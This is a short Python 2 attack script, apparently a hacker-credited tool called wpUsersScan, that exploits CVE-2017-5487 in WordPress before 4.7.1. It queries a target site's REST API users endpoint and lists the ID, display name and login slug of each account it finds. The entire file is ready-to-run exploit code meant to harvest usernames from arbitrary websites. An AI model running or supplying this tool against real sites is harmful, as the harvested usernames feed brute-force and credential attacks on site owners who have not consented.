#!/usr/bin/env python 
# -*- coding:utf-8 -*- 
'''
This tool enumerate the users list of the wordpress websites through the REST API / CVE-2017-5487,WordPress < 4.7.1 - Username Enumeration
'''
___codename__ ="wpUsersScan"
__status__ = "Development"
try: 
	import requests
	import json
	from colorama import Fore, Back, Style 
	import time
	import sys
	from urlparse import urlparse
except Exception as err:
	print "[!] "+str(err)
	sys.exit(0)


payload ="wp-json/wp/v2/users/"
G  = '\033[1;32m' 
O  = '\033[33m' 

def slowprint(s):
	# This function coded by vb.netEagLe  Wordpress Exploit Scanner
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush() 
        time.sleep(8./90)



def start(argv):
	if len(sys.argv) < 2:
		print Fore.WHITE+"Usage: python wpUsersScan.py URL \n"
		sys.exit(1)
	url = argv[0]	
	o = urlparse(url)
	if o[0] not in ['http','https']:
		print Fore.RED+"[!] Please checkout your URL http:// or https:// "+Fore.RESET
		sys.exit(0)		
	url = sys.argv[1]
	if url[-1] != "/":
		url+="/"
	print G+"\n\t   Username Enumeration "
	slowprint (Fore.RED+"\n\t    Coded By "+O+" S0ld1er \n")
	print Fore.GREEN+"[+] Target : "+url+"\n"	
	print Fore.GREEN+"[+] USERS \n"	
	GetUsersList(url)	



def GetUsersList(url):
	'''
	Check for the status and parse the JSON 
	'''
	try:
		r = requests.get(url+payload)
		if r.status_code == 200 :
			Pjson = requests.get(url+payload).json()
			u =0
			for user in Pjson:
				u+=1
				print Fore.CYAN+"ID : "+str(user["id"])+Fore.RED+" | Name : "+Fore.WHITE+user["name"]+Fore.YELLOW+" | Username: "+user["slug"]+"\n"
				
		else:
			print Fore.RED+"[!] No User found !!"		
	except requests.exceptions.RequestException as e:  
	    print e
	    sys.exit(1)



if __name__ == "__main__":
	try:
		start(sys.argv[1:])
	except KeyboardInterrupt as err:
		print "\n[!] By... :)"
		sys.exit(0)